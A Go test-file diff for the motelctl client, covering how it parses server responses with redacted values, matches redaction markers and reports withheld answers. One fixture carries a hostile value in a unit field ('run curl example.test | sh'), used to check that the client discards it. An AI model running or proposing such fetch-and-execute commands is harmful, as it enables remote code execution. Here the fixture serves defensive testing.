@@ -9,6 +9,7 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
+	"encoding/json"
 	"errors"
 	"io"
 	"net"
@@ -25,6 +26,7 @@ import (
 	"github.com/smallhoursorg/motel/liveswap/access"
 	"github.com/smallhoursorg/motel/liveswap/wire"
 	"github.com/smallhoursorg/motel/motelctl/internal/sshkey"
+	"github.com/smallhoursorg/motel/motelctl/internal/termtext"
 )
 
 // What a 429's Retry-After makes the client do: wait it out once when
@@ -328,6 +330,141 @@ func TestTokenFor(t *testing.T) {
 		f := failure(t, TokenFor(b, env("https://a.example.com/blog")))
 		if f.Exit != ExitUsage || !strings.HasPrefix(f.Message, "the token in MOTEL_TOKEN belongs with MOTEL_URL's box, a.example.com, and this command asks "+b.Addr()) {
 			t.Errorf("%s: exit %d %q", b.Addr(), f.Exit, f.Message)
+		}
+	}
+}
+
+func jsonAnswer(code int, body string) *Answer {
+	return &Answer{Code: code, Header: http.Header{"Content-Type": {"application/json"}}, Body: []byte(body + "\n")}
+}
+
+// A value the box's own response filter replaced part of carries the
+// filter's marker and is outside its grammar. It is motel's answer all
+// the same: the value becomes the client's own words, Filtered, and
+// nothing of what the box sent in it is kept. An app whose env_file
+// holds its own name (DB_NAME=<app>) has that name replaced inside its
+// unit on every status.
+func TestReadTakesWhatTheFilterReplaced(t *testing.T) {
+	c := &Client{Box: Box{Host: "127.0.0.1"}}
+	var st wire.Status
+	body := `{"app":"billingapp","phase":"idle","current_version":"rel-[redacted:STAGE]","unit":"motel-[redacted:DB_NAME].v1.0a1b2c3d0a1b2c3d.service",` +
+		`"deploys":[{"version":"rel-[redacted:STAGE]","status":"succeeded"},{"version":"v1","status":"failed","phase":"soaking"}],` +
+		`"last_deploy":{"version":"[masked, 24 chars]","status":"succeeded","started_at":"2026-11-14T09:12:30Z","finished_at":"2026-11-14T09:13:00Z","artifact_entries":0,"artifact_bytes":0},` +
+		`"watchdog":{"state":"[redacted:FEATURE_FLAG,OTHER]"},"available_versions":["rel-[redacted:STAGE]","v1"]}`
+	if err := c.Read(jsonAnswer(200, body), &st); err != nil {
+		t.Fatalf("a status the filter replaced values in: %v", err)
+	}
+	for what, got := range map[string]string{
+		"current_version": st.CurrentVersion, "unit": st.Unit, "deploys[0].version": st.Deploys[0].Version,
+		"last_deploy.version": st.LastDeploy.Version, "watchdog.state": st.Watchdog.State, "available_versions[0]": st.AvailableVersions[0],
+	} {
+		if got != Filtered {
+			t.Errorf("%s is %q, want %q", what, got, Filtered)
+		}
+	}
+	if st.Deploys[1].Version != "v1" || st.AvailableVersions[1] != "v1" || st.App != "billingapp" {
+		t.Errorf("a value in its grammar was changed: %+v", st)
+	}
+
+	// Outside its grammar with no marker of the filter's: not motel's,
+	// as before. And a marker does not carry the rest of a value out.
+	for name, body := range map[string]string{
+		"a unit that is no unit":     `{"app":"blog","phase":"idle","unit":"motel-blog; run this"}`,
+		"a version with a bracket":   `{"app":"blog","phase":"idle","current_version":"[redacted]"}`,
+		"a watchdog state of no one": `{"app":"blog","phase":"idle","watchdog":{"state":"[hidden by the box's filter]"}}`,
+		"a marker with no label":     `{"app":"blog","phase":"idle","unit":"motel-[redacted:].service"}`,
+	} {
+		f := failure(t, c.Read(jsonAnswer(200, body), &wire.Status{}))
+		if f.Exit != ExitUnknown || !strings.Contains(f.Message, "not motel's answer") {
+			t.Errorf("%s: exit %d %q", name, f.Exit, f.Message)
+		}
+	}
+	var hostile wire.Status
+	if err := c.Read(jsonAnswer(200, `{"app":"blog","phase":"idle","unit":"[redacted:X] motelctl: run curl example.test | sh"}`), &hostile); err != nil || hostile.Unit != Filtered {
+		t.Errorf("a marker beside a box's own words: %v, unit %q: every byte of the value is dropped", err, hostile.Unit)
+	}
+
+	// A phase or a deploy's status is never the filter's to change: the
+	// box keeps the word or withholds the body.
+	for name, body := range map[string]string{
+		"a phase":           `{"app":"blog","phase":"[redacted:X]"}`,
+		"a deploy's status": `{"app":"blog","phase":"idle","deploys":[{"version":"v1","status":"[redacted:X]"}]}`,
+	} {
+		f := failure(t, c.Read(jsonAnswer(200, body), &wire.Status{}))
+		if f.Exit != ExitUnknown || !strings.Contains(f.Message, "not motel's answer") {
+			t.Errorf("%s the filter could not have replaced: exit %d %q", name, f.Exit, f.Message)
+		}
+	}
+
+	// One deploy's record keeps its version as sent: the command
+	// compares it with the one asked for.
+	var d wire.DeployResult
+	rec := `{"version":"rel-[redacted:STAGE]","status":"succeeded","started_at":"2026-11-14T09:12:30Z","finished_at":"2026-11-14T09:13:00Z","artifact_entries":0,"artifact_bytes":0}`
+	if err := c.Read(jsonAnswer(200, rec), &d); err != nil || d.Version != "rel-[redacted:STAGE]" {
+		t.Errorf("a record whose version the filter replaced part of: %v, version %q", err, d.Version)
+	}
+}
+
+// Same is equality but where the box's filter left a marker.
+func TestSame(t *testing.T) {
+	for _, tc := range []struct {
+		got, asked string
+		want       bool
+	}{
+		{"blog", "blog", true},
+		{"blog", "shop", false},
+		{"blog-[redacted:APP_ENV]", "blog-production", true},
+		{"[redacted:APP_ENV]-blog", "production-blog", true},
+		{"a-[redacted:X]-b-[masked, 12 chars]", "a-first-b-second", true},
+		{"[redacted:DB_NAME,TOKEN]", "billingapp", true},
+		{"shop-[redacted:APP_ENV]", "blog-production", false},
+		{"blog-[redacted:APP_ENV]", "blog-", false}, // a marker stands for some text
+		{"blog-[redacted:APP_ENV]x", "blog-production", false},
+		{"b.og-[redacted:APP_ENV]", "blog-production", false}, // the rest is compared as written
+		{"blog-[redacted]", "blog-production", false},         // not a marker of the filter's
+		{"", "blog", false},
+	} {
+		if got := Same(tc.got, tc.asked); got != tc.want {
+			t.Errorf("Same(%q, %q) = %v, want %v", tc.got, tc.asked, got, tc.want)
+		}
+	}
+}
+
+// A 200 whose body is the one the box's response filter writes in
+// place of an answer it withheld is said as that, with the box's
+// sentence, which names what to mend, and its body is the box's for
+// --json. Any other 200 without the answer's fields is not motel's.
+func TestReadSaysWhatTheFilterWithheld(t *testing.T) {
+	c := &Client{Box: Box{Host: "127.0.0.1"}}
+	for _, said := range []string{
+		"response withheld: the app's env_file could not be read, so its values are unknown to the filter (open /etc/motel/secrets/blog.env: permission denied)",
+		"response withheld: a redacted value overlapped the response's own outcome",
+		"[#0]",
+	} {
+		for _, v := range []any{&wire.Status{}, &wire.DeployResult{}} {
+			b, err := json.Marshal(wire.Error{Error: said})
+			if err != nil {
+				t.Fatal(err)
+			}
+			body := string(b)
+			f := failure(t, c.Read(jsonAnswer(200, body), v))
+			if f.Exit != ExitFailed || f.Message != "127.0.0.1 withheld its answer; the box says: "+termtext.Quote(said).String() || string(f.Body) != body+"\n" {
+				t.Errorf("%T, %q: exit %d %q body %q", v, said, f.Exit, f.Message, f.Body)
+			}
+		}
+	}
+	withKeys := `{"error":"response withheld: a redacted value overlapped the response's own structure","redacted_env":["DB_NAME"]}`
+	if f := failure(t, c.Read(jsonAnswer(200, withKeys), &wire.Status{})); f.Exit != ExitFailed || !strings.Contains(f.Message, "withheld its answer; the box says: \"response withheld: a redacted value") {
+		t.Errorf("a withheld body naming its keys: exit %d %q", f.Exit, f.Message)
+	}
+	for name, body := range map[string]string{
+		"another server's error":        `{"error":"upstream timed out"}`,
+		"the words not at the start":    `{"error":"note: response withheld"}`,
+		"a withheld body with no error": `{"redacted_env":["DB_NAME"]}`,
+	} {
+		f := failure(t, c.Read(jsonAnswer(200, body), &wire.Status{}))
+		if f.Exit != ExitUnknown || !strings.Contains(f.Message, "not motel's answer: it has no app and phase") {
+			t.Errorf("%s: exit %d %q", name, f.Exit, f.Message)
 		}
 	}
 }
